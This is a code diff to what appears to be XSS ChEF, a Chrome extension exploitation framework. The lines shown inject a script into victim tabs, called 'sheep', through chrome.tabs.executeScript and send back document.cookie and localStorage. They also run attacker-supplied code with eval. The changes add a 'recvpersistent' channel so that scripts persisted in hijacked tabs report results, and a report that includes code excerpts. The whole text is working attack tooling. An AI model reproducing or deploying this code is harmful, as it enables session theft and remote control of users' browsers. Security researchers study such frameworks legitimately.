@@ -49,7 +49,6 @@ function __xsschef() {
                 __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
             break;
             case 'eval':
-                // __p.postMessage({cmd:'recveval', p: eval(msg.p)});
                 __logEval(eval(msg.p));
             break;
         }
@@ -182,7 +181,7 @@ function __xsschef() {
 
         try {
             chrome.tabs.executeScript(tab.id, 
-                {'code': '(function(){window.__logEval=function(obj){__p.postMessage({cmd:"recveval", p:obj});};window.__p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
+                {'code': '(function(){window.__logScript=function(name,obj){__p.postMessage({cmd:"recvpersistent", name:name, p:obj})};window.__logEval=function(obj){__p.postMessage({cmd:"recveval", p:obj});};window.__p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
             );
         } catch(e) {
             delete sheeps[tab.id];
@@ -196,8 +195,9 @@ function __xsschef() {
                 case 'recveval': // from sheeps
                     log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                 break;
-                // todo: command to store something from sheep in ext?
-                
+                case 'recvpersistent': // from sheeps 
+                    log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p, name: msg.name});
+                break;                
                 // all below commands are from backchannel
                 case 'eval':
                     if (msg.id) { // eval in sheep
@@ -417,7 +417,10 @@ function __xsschef() {
     var report_persistent = function() {
         var clone = [];
         Object.keys(persistentScripts).forEach(function(key) {
-            clone.push({ name: key, urlmatch: persistentScripts[key].urlmatch });
+            clone.push({ name: key, 
+                         urlmatch: persistentScripts[key].urlmatch, 
+                         code: persistentScripts[key].code.substr(0,100) + "..."
+                      });
         });
 
         log({type: 'report_persistent', 'result': clone});
